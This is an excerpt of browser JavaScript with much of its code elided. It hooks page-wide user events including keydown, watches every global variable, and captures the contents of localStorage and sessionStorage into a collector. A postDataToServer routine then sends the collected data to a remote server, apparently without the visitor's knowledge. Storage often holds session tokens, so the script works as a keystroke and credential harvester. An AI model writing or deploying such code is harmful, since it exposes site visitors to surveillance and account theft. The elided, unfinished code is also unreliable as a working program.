(function (p) {
  var trackedEvents = ["click", "mousemove", "keydown", "touchstart"];
  ...
  var localToTrack = ["localStorage", "sessionStorage"];
  function t(D) {
  ...
  function hook(obj, prop, handler) {
    let val = obj[prop],
      newValue = val;
  ...
  function jshookEvents() {
    for (const event of trackedEvents) {
      document.addEventListener(event, ({
        ...
        globalVarCollector[event] = globalVarCollector[event] || [];
        globalVarCollector[event].push(eventInfo);
      }, true);
    }
  }
  function initialHookGlobal() {
    for (let prop in window) {
      hook(window, prop, (oldValue, newValue) => {
        globalVarCollector[prop] = {
          oldValue,
          newValue
        };
        return newValue;
  ...
  function initialHookLocal() {
    for (const storageName of localToTrack) {
      let storage = window[storageName];
      if (!storage) continue;
      for (let i = 0; i < storage.length; i++) {
        let prop = storage.key(i);
        hook(storage, prop, (oldValue, newValue) => {
          globalVarCollector[`${storageName}.${prop}`] = {
            oldValue,
            newValue
          };
          return newValue;
  ...
  async function postDataToServer(data) {
    ...
    try {
      ...
      if (resp.ok) {
        ...
        console.error('数据发送失败,状态码:' + resp.status);
      }
    } catch (error) {
  ...
  function sendData() {
    postDataToServer(globalVarCollector);
    globalVarCollector = {};
  }
  var b = function () {
